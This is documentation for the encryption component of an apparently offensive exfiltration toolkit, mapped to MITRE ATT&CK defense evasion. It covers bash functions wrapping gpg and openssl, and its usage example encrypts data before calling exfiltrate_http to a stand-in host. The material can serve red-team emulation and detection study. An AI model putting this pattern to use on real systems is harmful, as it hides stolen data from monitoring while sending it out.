# Encryption Functionality

## Overview
The encryption functionality provides secure data protection for exfiltrated data using industry-standard encryption methods. This document describes the encryption system implementation and usage.

## MITRE ATT&CK Mapping
- **Tactic**: Defense Evasion (TA0005)
- **Technique**: Obfuscated Files or Information (T1027)

## Supported Encryption Methods
- `none`: No encryption (default)
- `gpg`: GPG symmetric encryption using AES-256
- `aes`: OpenSSL AES-256-CBC encryption

## Components

### 1. Setup Encryption
The `setup_encryption()` function initializes the encryption system:
- Validates the requested encryption method
- Generates a random encryption key
- Sets up global encryption state

```bash
setup_encryption "gpg"  # Returns 0 on success, 1 on failure
```

### 2. Key Generation
The `generate_encryption_key()` function creates cryptographically secure random keys:
- Uses OpenSSL's random number generator
- Generates 32 bytes of random data
- Returns base64 encoded key

```bash
key=$(generate_encryption_key)
```

### 3. Method Validation
The `validate_encryption_method()` function ensures only supported methods are used:
- Checks input against list of supported methods
- Returns 0 for valid methods, 1 for invalid
- Provides helpful error messages

```bash
validate_encryption_method "gpg"  # Returns 0 if valid
```

### 4. Data Encryption
The `encrypt_output()` function performs the actual encryption:
- Supports multiple encryption methods
- Handles errors gracefully
- Returns encrypted data in appropriate format

```bash
encrypted_data=$(encrypt_output "$data" "$method" "$key")
```

## Usage Example

```bash
# Initialize encryption
if setup_encryption "gpg"; then
    # Encrypt data
    data="sensitive information"
    encrypted=$(encrypt_output "$data" "gpg" "$ENCRYPT_KEY")
    
    # Exfiltrate encrypted data
    exfiltrate_http "$encrypted" "https://example.com"
fi
```

## Security Considerations

1. Key Management
   - Keys are generated using cryptographically secure random number generation
   - Keys are transmitted separately from encrypted data
   - Keys are stored only in memory, never written to disk

2. Encryption Strength
   - GPG uses AES-256 in symmetric mode
   - AES uses 256-bit CBC mode with secure key derivation
   - All encryption operations use standard library implementations

3. Error Handling
   - Failed encryption operations are detected and reported
   - Invalid methods are rejected early
   - Error messages don't leak sensitive information

## Implementation Details

1. Key Generation
   ```bash
   openssl rand -base64 32
   ```

2. GPG Encryption
   ```bash
   gpg --batch --yes --passphrase "$key" --symmetric --cipher-algo AES256
   ```

3. AES Encryption
   ```bash
   openssl enc -e -aes-256-cbc -base64 -k "$key"
   ```

## Best Practices

1. Always validate encryption methods before use
2. Generate new keys for each encryption session
3. Handle encryption errors appropriately
4. Use secure key transmission methods
5. Clear sensitive data from memory when possible

## Limitations

1. Key transmission must be handled separately
2. Some encryption methods may not be available on all systems
3. Performance impact with large datasets
4. Memory constraints with very large keys or data 